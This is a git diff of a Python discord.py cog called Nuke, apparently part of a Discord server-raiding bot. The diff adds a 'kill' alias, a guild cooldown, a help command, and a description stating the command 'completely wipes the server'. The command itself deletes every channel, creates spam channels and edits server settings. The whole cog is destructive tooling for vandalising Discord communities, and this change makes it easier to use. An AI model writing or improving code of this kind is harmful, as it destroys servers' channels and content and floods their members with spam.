@@ -1,20 +1,28 @@
 import discord
 from discord.ext import commands
 from datetime import (
-    datetime, 
-    timedelta, 
+    datetime,
+    timedelta,
     timezone
 )
 from src.operations.operations import (
-    delete_channels, 
+    delete_channels,
     create_channels_and_spam
 )
+from src.core.managers.predicates import cooldown
+from src.core.managers.help import send_bot_help, send_command_help
+
 
 class Nuke(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
-    @commands.command(name="nuke")
+    @commands.command(
+        name="nuke",
+        aliases=["kill"],
+        description="Completely wipes the server",
+        help="Deletes all channels, creates new ones with spam, edits server settings, and creates a scheduled event")
+    @cooldown(1, 600, commands.BucketType.guild)
     async def nuke(self, ctx: commands.Context):
         await ctx.message.delete()
         await ctx.guild.edit(
@@ -38,3 +46,14 @@ class Nuke(commands.Cog):
             pass
         await delete_channels(ctx.guild)
         await create_channels_and_spam(ctx.guild)
+
+    @commands.command(name="help", aliases=["h"])
+    async def help(self, ctx: commands.Context, *, command: str = None):
+        if command is None:
+            await send_bot_help(ctx)
+        else:
+            cmd = self.bot.get_command(command)
+            if cmd:
+                await send_command_help(ctx, cmd)
+            else:
+                await ctx.send(f"Command `{command}` not found.")
